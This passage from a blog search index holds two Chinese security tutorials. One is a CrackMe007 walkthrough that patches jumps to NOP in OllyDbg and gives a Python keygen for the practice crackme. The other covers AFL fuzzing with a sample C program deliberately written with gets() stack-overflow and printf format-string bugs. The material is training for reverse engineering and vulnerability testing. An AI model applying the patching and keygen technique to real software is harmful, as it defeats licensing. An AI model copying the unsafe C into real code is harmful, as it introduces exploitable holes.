<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>『逆向』CrackMe007 逆向分析</title>
      <link href="/posts/7dac.html"/>
      <url>/posts/7dac.html</url>
      
        <content type="html"><![CDATA[<h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><ul><li><p><a href="https://github.com/TonyChen56/160-Crackme/tree/master/160%E4%B8%AACrackme007">crackme 007程序下载地址</a></p></li><li><p><a href="https://www.52pojie.cn/thread-1472768-1-1.html">Windows DarkDe4下载安装</a></p></li></ul><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240421234051364.png" alt="image-20240421234051364"></p><p>点击help，可以看到提示：破解目标是使所有的按钮消失，让程序下面的蓝色logo完整显现出来，不允许爆破。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422105549546.png" alt="image-20240422105549546"></p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>用Exeinfo PE工具查看该程序，得到信息如下图，可知该程序没有加壳，用Delphi语言编写。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422110526986.png" alt="image-20240422110526986"></p><p>并不需要脱壳处理</p><h2 id="DarkDe查看事件控件"><a href="#DarkDe查看事件控件" class="headerlink" title="DarkDe查看事件控件"></a>DarkDe查看事件控件</h2><p>因为是delphi的程序，先<strong>用Delphi的专用反编译工具DarkDe搜索涉及到的控件和事件函数信息</strong></p><p>事件信息：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422111325644.png" alt="image-20240422111325644"></p><p>控件信息：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422111332284.png" alt="image-20240422111332284"></p><p>可以看到程序有以下几个事件: </p><ul><li>Cancella按钮的点击事件 </li><li>About按钮的点击事件 </li><li>Registerz按钮的点击事件 </li><li>Again按钮的点击事件</li></ul><p>总共四个按钮事件。</p><p>在程序最开始并没有看到Again按钮，猜测为一个隐藏按钮。最开始只有一个Register按钮，因此我们<strong>后续就从Registerz按钮的点击事件开始分析</strong>。</p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>将程序拖入ollydbg</p><p>分别在前面发现的事件对应的位置：00442B98，00442F28，004430BC上下断点</p><p>在Registerz按钮点击事件的位置 <code>00442F28</code> 下断点</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422113737449.png" alt="image-20240422113737449"></p><p>可以看到这里调用了两个函数，去对应的地址看一下，第一个函数为获取codice，第二个函数检测codice是否为纯数字。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422155744890.png" alt="image-20240422155744890"></p><p>分析下面的 <code>je</code> 跳转代码，可以知道这里对codice进行了验证，如果codice是纯数字则跳转到 <code>00442F9D</code> 继续执行，如果不是纯数字则会弹窗 <code> &quot;You MUST insert a valid Long Integer Value in the Code Editor... Thank you :)&quot;</code></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422161158972.png" alt="image-20240422161158972"></p><p>所以正常情况下应该执行  <code>00442F9D</code> ，观察 <code>00442F9D</code> 后的代码，可以看到走到 <code>00442F9F  </code> 又会跳转到 <code>00442FFB</code> ，但是这个跳转处的注释为 “Please… The Code Must be &gt;0”，很明显这是一个异常提示的跳转，所以在这里未发生跳转为程序正常执行</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422161337070.png" alt="image-20240422161337070"></p><p>继续查看未发生跳转部分的汇编代码，可以看到 <code>00442FC0  </code> 处存在第三个跳转到 <code>00442FF2  </code> ，从 <code>00442FF2  </code> 处向下看经过了 <code>00442FFB</code> 处也就是错误提示的字符串，所以在 <code>00442FC0  </code> 处我们不让程序发生跳转，将 je 改为NOP</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422162604439.png" alt="image-20240422162604439"></p><p>继续运行程序，可以看到register按钮消失，出现了新的按钮again，直接点击again，可以看到停在了 <code>004430BC</code> 处。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422163242089.png" alt="image-20240422163242089"></p><p>向下翻看代码发现和前面的register按钮函数类似，我们执行同样的操作，将找到的位置 <code>00443159</code> 改为NOP。</p><p>F9继续运行，可以看到已经成功实现了logo的还原，成功爆破。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422163618513.png" alt="image-20240422163618513"></p><h2 id="序号生成算法分析"><a href="#序号生成算法分析" class="headerlink" title="序号生成算法分析"></a>序号生成算法分析</h2><h3 id="密码不为纯数字"><a href="#密码不为纯数字" class="headerlink" title="密码不为纯数字"></a>密码不为纯数字</h3><p>当密码不为纯数字的时候，程序会根据密码生成一个值 <code>[0x445830]</code>，后续密码不为纯数字时需要根据这个值来进行运算，所以第一次输入的时候，密码一定要为纯字母，不然无法注册成功。</p><p>算法函数 <code>00442FB9</code> 中的计算涉及到了 eax ，在前面有一个对 eax进行赋值的操作：在442FB4位置对eax进行了赋值，将地址445830的数值赋给了eax。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423143154927.png" alt="image-20240423143154927"></p><p>再检查在什么地方对地址445830进行了赋值，在地址442FB4处[右键]-[查找参考]-[地址常量]，可以查找到程序中所有涉及到这个地址常量的位置。</p><p>可以看到这个地址前面存在一个对445830进行赋值的操作，双击查看</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423145554207.png" alt="image-20240423145554207"></p><p>可以看到，当Codice输入的不全是数字时才对[0x445830] 赋值操作，而赋值为00442A8C的返回值</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423145736385.png" alt="image-20240423145736385"></p><p>对00442A8C进行进一步分析，可以知道对应的[0x445830] 赋值方法</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423150158348.png" alt="image-20240423150158348"></p><h3 id="密码为纯数字"><a href="#密码为纯数字" class="headerlink" title="密码为纯数字"></a>密码为纯数字</h3><p>第二次输入密码为纯数字。</p><p>在这种情况下，分析后面的代码可以知道 <code>00442FB9</code> 为算法函数</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422164900113.png" alt="image-20240422164900113"></p><p>crtl + G 跟进到 <code>00442FB9</code> 查看算法函数，可以看到要求用户名要大于4个字符</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422165807004.png" alt="image-20240422165807004"></p><p>接下来进行了两层循环，计算的是用户名的第一位和最后一位的乘积，然后再乘以 <code>[0x445830]</code> 。外层循环变换用户名最后一位，每次往前移动一位。内层循环变换用户名第一位，每次往后移动一位。接着将结果保存到eax。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422170314520.png" alt="image-20240422170314520"></p><ul><li>将eax对 <code>0xA2C2A</code> 取模，记为结果1</li><li>将输入的密码除以 0x59 加上密码mod0x50，结果再加1，记为结果2</li><li>比较结果1和结果2是否相等。相等则返回1，消失按钮。不相等则返回0。</li></ul><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422170812472.png" alt="image-20240422170812472"></p><p>again 按钮的函数算法类似</p><h1 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">szBuff = <span class="built_in">bytearray</span>(<span class="number">30</span>)</span><br><span class="line">CoBuff = <span class="built_in">bytearray</span>(<span class="number">30</span>)</span><br><span class="line">Regcode = <span class="number">0</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">Temp = <span class="number">0x37B</span></span><br><span class="line">Sum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CrackeMe007注册机使用说明:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;输入纯字母的codice，关闭报错弹窗后填入计算出的正确codice&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入不少于6位的全字母codice:&quot;</span>)</span><br><span class="line">szBuff = <span class="built_in">input</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(szBuff) - <span class="number">1</span>):</span><br><span class="line">    Temp = Temp + ((szBuff[i + <span class="number">1</span>] % <span class="number">0x11</span> + <span class="number">1</span>) * szBuff[i])</span><br><span class="line"></span><br><span class="line">Temp = Temp % <span class="number">0x7148</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入用户名:不少于5位的纯数字&quot;</span>)</span><br><span class="line">CoBuff = <span class="built_in">input</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(CoBuff)):</span><br><span class="line">    Sum = Sum + CoBuff[i]</span><br><span class="line"></span><br><span class="line">Sum = (Sum * Sum * Temp) % <span class="number">0XA2C2A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0X50</span>):</span><br><span class="line">    Regcode = (Sum - i - <span class="number">1</span>) * <span class="number">0X59</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0X50</span>):</span><br><span class="line">        Temp = (Regcode + j) % <span class="number">0X50</span></span><br><span class="line">        <span class="keyword">if</span> Temp == i:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;用户名:%s对应的第%d个可用的注册码：%d&quot;</span> % (CoBuff.decode(<span class="string">&#x27;utf-8&#x27;</span>), a, Regcode + j))</span><br><span class="line">            a = a + <span class="number">1</span></span><br><span class="line">        Temp = <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;Press Enter to exit...&quot;</span>)</span><br><span class="line">sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>随便构造纯数字的name和全字母的codice</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140221413.png" alt="image-20240423140221413"></p><p>产生报错，用上面的注册机生成密码</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140316807.png" alt="image-20240423140316807"></p><p>输入生成的第一个codice，可以看到register按钮消失</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140341510.png" alt="image-20240423140341510"></p><p>再输入前面固定的字符串，点击again按钮</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140629271.png" alt="image-20240423140629271"></p><p>再输入前面注册机得到的codice，成功显现所有的Logo，完成破解</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140701596.png" alt="image-20240423140701596"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://www.cnblogs.com/lonenysky/p/11345362.html">逆向破解之160个CrackMe —— 007</a></li><li><a href="https://blog.csdn.net/M_N_N/article/details/78206825">160个练手CrackMe-007</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『模糊测试』使用AFL进行模糊测试</title>
      <link href="/posts/a48c.html"/>
      <url>/posts/a48c.html</url>
      
        <content type="html"><![CDATA[<h1 id="模糊测试简介"><a href="#模糊测试简介" class="headerlink" title="模糊测试简介"></a>模糊测试简介</h1><p><strong>模糊测试（Fuzzing）</strong>，是一种挖掘软件安全漏洞、检测软件健壮性的黑盒测试方法，是目前软件测试、漏洞挖掘领域的最有效的手段之一，特别适合用于发现0Day漏洞。</p><p>其<strong>主要原理</strong>在于：</p><ul><li>通过随机或是半随机的方式生成大量数据，</li><li>将生成的数据输入给被测试的系统</li><li>检测被测系统的状态，如是否能够响应、响应是否正确等</li><li>根据被测系统的状态判断是否存在潜在的安全漏洞。</li></ul><p>目前比较成功的Fuzzer（执行模糊测试的程序）有AFL、libFuzzer、OSS-Fuzz等。</p><h1 id="AFL简介"><a href="#AFL简介" class="headerlink" title="AFL简介"></a>AFL简介</h1><p>AFL（American Fuzzy Lop）是由安全研究员Michal Zalewski开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240321161056683.png" alt="image-20240321161056683"></p><p>调试人员为程序提供一些输入，即最左侧的testcases，AFL加载后将其放入一个队列中。对于每一次迭代，AFL首先从队列中取出一个testcase，然后对它进行修剪，去除不必要的数据以提高运行效率；再然后对输入进行变异操作，变异的模式很多，可以产生很多新的testcase。对于这些新产生的输入，将它们送到目标程序运行，若能够产生新的执行路径或者导致程序崩溃，就把它再放到队列中。在整个过程中，程序崩溃会被记录下来，它可能代表一个潜藏的漏洞。</p><h2 id="AFL和LibFuzzer的区别"><a href="#AFL和LibFuzzer的区别" class="headerlink" title="AFL和LibFuzzer的区别"></a>AFL和LibFuzzer的区别</h2><p>LibFuzzer和AFL是目前最基本的两个模糊测试工具，而大部分的Fuzzer都是基于AFL和Libfuzzer进行进一步改进实现的，只要将这两个模糊测试工具弄明白，其它工具的安装和部署都是大同小异。</p><p>AFL和LibFuzzer的区别</p><ol><li><strong>集成方式：</strong><ul><li><strong>LibFuzzer：</strong> 通常与源代码直接集成，作为代码的一部分进行编译。它需要目标函数（即被测试的函数）的接口符合特定的格式（接受字节数组和长度作为参数）。</li><li><strong>AFL：</strong> 可以作为一个独立的工具运行，不需要对源代码进行修改。它通过插桩技术来监控程序的执行，以此来引导测试用例的生成。</li></ul></li><li><strong>测试用例生成：</strong><ul><li><strong>LibFuzzer：</strong> 使用基于覆盖率的指导来动态生成测试用例，旨在最大化代码覆盖率。</li><li><strong>AFL：</strong> 同样使用基于覆盖率的方法，但还结合了遗传算法来进化测试用例。</li></ul></li><li><strong>使用场景：</strong><ul><li><strong>LibFuzzer：</strong> 由于需要与源代码直接集成，因此更适合于对特定函数或模块进行深入的单元测试。</li><li><strong>AFL：</strong> 由于可以作为独立工具运行，因此更适合于对整个应用程序进行模糊测试，包括二进制文件。</li></ul></li></ol><p>根据不同的场景，我们可以从AFL和LibFuzzer中做出选择</p><h1 id="AFL的安装"><a href="#AFL的安装" class="headerlink" title="AFL的安装"></a>AFL的安装</h1><p>从 <a src="https://github.com/google/AFL">github项目主页</a> 下载压缩包，解压后进入所在目录。</p><p>执行以下命令进行编译和安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>输入 <code>afl-fuzz</code> 测试是否编译成功</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240321170854676.png" alt="image-20240321170854676"></p><h1 id="使用AFL进行模糊测试实战"><a href="#使用AFL进行模糊测试实战" class="headerlink" title="使用AFL进行模糊测试实战"></a>使用AFL进行模糊测试实战</h1><h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><ol><li><p><strong>确定项目用什么语言编写</strong></p><p>AFL主要用于C&#x2F;C++程序的测试，所以我们先要确定项目是否为C&#x2F;C++编写。（也有一些基于AFL的JAVA Fuzz程序如<a href="https://github.com/isstac/kelinci">kelinci</a>、<a href="https://github.com/Barro/java-afl">java-afl</a>等，但并不知道效果如何）</p><p>如果要批量使用AFL进行模糊测试，如何判断项目的语言：</p><ul><li>项目提供了源代码：使用 <a src="https://github.com/github-linguist/linguist">github-linguist库</a> 进行判断</li><li>项目仅提供二进制文件：</li></ul></li><li><p><strong>是否有示例程序、测试用例</strong></p><ul><li><p>如果目标有现成的示例程序，特别是一些开源的库，可以方便我们直接用示例程序调用该库，不用自己再写一个程序</p></li><li><p>如果目标已经提供测试用例，那后面构建语料库时也省事儿一点</p></li></ul></li><li><p><strong>项目规模</strong></p><p>某些程序规模很大，会被分为好几个模块，为了提高Fuzz效率，在Fuzzing前，需要定义Fuzzing部分。这里推荐一下源码阅读工具Understand，它 <code>treemap</code> 功能，可以直观地看到项目结构和规模。比如下面ImageMagick的源码中，灰框代表一个文件夹，蓝色方块代表了一个文件，其大小和颜色分别反映了行数和文件复杂度。</p></li></ol><h2 id="构建语料库"><a href="#构建语料库" class="headerlink" title="构建语料库"></a>构建语料库</h2><p>AFL需要一些初始输入数据（即种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。</p><p>尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库，这一节就解决如何选择输入文件、从哪里寻找这些文件、如何精简找到的文件三个问题。</p><h2 id="标准模式——有源码fuzz"><a href="#标准模式——有源码fuzz" class="headerlink" title="标准模式——有源码fuzz"></a>标准模式——有源码fuzz</h2><h3 id="编译插桩"><a href="#编译插桩" class="headerlink" title="编译插桩"></a>编译插桩</h3><p>首先我们可以自行用编写一个有漏洞的C语言程序 afl_test.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">AFLTest</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">16</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为16，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    AFLTest(buf);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对该源文件进行编译插桩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc afl_test.c -o afl_test</span><br></pre></td></tr></table></figure><blockquote><p>如果编译一个c++的源码，使用afl-g++。</p></blockquote><p>现实情况下，我们往往需要对一整个项目而不是单个的C&#x2F;C++文件进行fuzz，所以需要指定afl-gcc&#x2F;afl-g++对整个项目进行编译插桩</p><blockquote><p>命令的具体含义与作用可以参考文章xx的 <code>linux下软件的发布与安装</code> 部分内容</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure CC=<span class="string">&quot;afl-gcc&quot;</span> CXX=<span class="string">&quot;afl-g++&quot;</span> --disable-shared <span class="comment"># 指定C和C++的编译器为afl所提供的编译插桩工具</span></span><br><span class="line">make <span class="comment"># 然后再进行编译</span></span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>编译后的结果如下图，可以看到对我们留下的漏洞产生了warning，不用理会</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240322154357305.png" alt="image-20240322154357305"></p><h3 id="建立输入和输出文件夹"><a href="#建立输入和输出文件夹" class="headerlink" title="建立输入和输出文件夹"></a>建立输入和输出文件夹</h3><p>一般的程序接收的输入为标准输入流stdin类型或者文件类型</p><blockquote><p>stdin指的是从标准输入流（stdin，标准输入设备）中获取输入数据。</p><p>stdin通常用于从终端（命令行）或其他程序中读取输入。这种方式可以让程序<strong>接受用户的交互式输入或从其他程序输出中获取数据</strong>，而<strong>无需直接依赖于文件或其他输入源</strong>。</p></blockquote><p>对于我们这个文件afl_test.c，可以知道接收的输入类型为stdin标准输入流</p><p>建立两个文件夹：fuzz_in和fuzz_out，用来存放程序的输入和fuzz的输出结果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> fuzz_in</span><br><span class="line"><span class="built_in">mkdir</span> fuzz_out</span><br></pre></td></tr></table></figure><p>在fuzz_in文件夹下构建初始测试用例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> fuzz_in</span><br><span class="line">vim testcase</span><br></pre></td></tr></table></figure><p>在testcae文件中写入程序的输入数据，这里也可以随意输入一点文本，作为起始种子。（因为afl会根据初始种子自动变异生成更多的测试样例，所以初始种子可以随意一点）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;asdsas&quot;</span> &gt;&gt; testcase</span><br></pre></td></tr></table></figure><blockquote><p><code>afl-fuzz</code>会将<code>testcase</code>文件中的内容作为输入，通过标准输入流（stdin）传递给目标程序。</p><p>所以这里是基于stdin而并不是文件</p></blockquote><h3 id="使用-afl-fuzz-工具执行fuzz测试"><a href="#使用-afl-fuzz-工具执行fuzz测试" class="headerlink" title="使用 afl-fuzz 工具执行fuzz测试"></a>使用 afl-fuzz 工具执行fuzz测试</h3><p>针对程序不同的输入类型：</p><ul><li><p>从stdin读取输入的目标程序，fuzz命令语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</span><br></pre></td></tr></table></figure><ul><li><code>-i</code>：指定测试用例所在的目录，表示从该目录中读取输入数据。</li><li><code>-o</code>：指定fuzz结果输出的目录</li><li><code>/path/to/program</code>：表示目标程序的路径</li><li><code>[...params...]</code>：表示其他可能的参数。</li></ul></li><li><p>从文件读取输入的目标程序来说，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure></li></ul><p>使用如下命令执行fuzz：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i fuzz_in -o fuzz_out ./easy_test</span><br></pre></td></tr></table></figure><p>经过一个半小时的fuzz，总共找到了4条执行路径（对应前面的程序代码），8个crash。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326111143917.png" alt="image-20240326111143917"></p><h3 id="结束fuzz"><a href="#结束fuzz" class="headerlink" title="结束fuzz"></a>结束fuzz</h3><p>afl-fuzz永远不会停止，所以何时停止测试很多时候就是依靠afl-fuzz提供的状态来决定的。具体的几种方式如下所示:</p><ul><li>状态窗口的<code>cycles done</code>变为绿色;</li><li><code>afl-whatsup</code>查看afl-fuzz状态;</li><li><code>afl-stat</code>得到类似于afl-whatsup的输出结果;</li><li>定制 <code>afl-whatsup</code> -&gt;在所有代码外面加个循环就好;</li><li>用 <code>afl-plot</code> 绘制各种状态指标的直观变化趋势;</li><li><code>pythia</code>估算发现新crash和path概率。</li></ul><h3 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h3><h4 id="fuzz界面分析"><a href="#fuzz界面分析" class="headerlink" title="fuzz界面分析"></a>fuzz界面分析</h4><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326111143917.png" alt="image-20240326111143917"></p><p>根据上面的fuzz界面图：</p><ol><li><p><strong>process timing</strong>:</p><ul><li><p><strong><code>last new path</code></strong> : 表示自从最后一个新路径被发现以来经过的时间。这可以帮助你了解新路径发现的频率。</p><blockquote><p>如果这个字段产生了报错，如：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240329171431783.png" alt="image-20240329171431783"></p><p>可能是因为：</p><ol><li><strong>语法错误</strong>：检查你的测试用例和目标程序，确保它们的语法正确。</li><li><strong>测试用例不足</strong>：如果你提供的初始测试用例过于简单或不足以触发新的路径，AFL 可能无法有效地探索目标程序的状态空间。</li><li><strong>代码覆盖率低</strong>：目标程序的某些部分可能难以触及，导致 AFL 无法发现新的路径。</li><li><strong>目标程序简单</strong>：如果目标程序非常简单，可能只有很少的执行路径，因此 AFL 无法发现新的路径。</li><li><strong>配置问题</strong>：检查 AFL 的配置设置，确保它们适合你的测试目标和环境。</li></ol><p>接下来要及时修正，不然继续fuzz也是徒劳（因为路径是不会改变的），可以采取以下解决方案：</p><ul><li><strong>增加测试用例</strong>：提供更多或更复杂的初始测试用例，以帮助 AFL 探索新的路径。</li><li><strong>调整 AFL 设置</strong>：调整 AFL 的参数和设置，例如增加变异率或改变变异策略，以尝试发现新的路径。</li><li><strong>优化目标程序</strong>：如果可能，修改目标程序以增加可触及的代码路径。</li><li><strong>增加测试时间</strong>：延长测试的时间，给 AFL 更多的机会发现新的路径。</li><li><strong>检查目标程序</strong>：确保目标程序没有错误，且适合模糊测试。</li></ul></blockquote></li><li><p><code>last uniq crash</code>: 表示自从最后一个独特崩溃被发现以来经过的时间。</p></li><li><p><code>last uniq hang</code>: 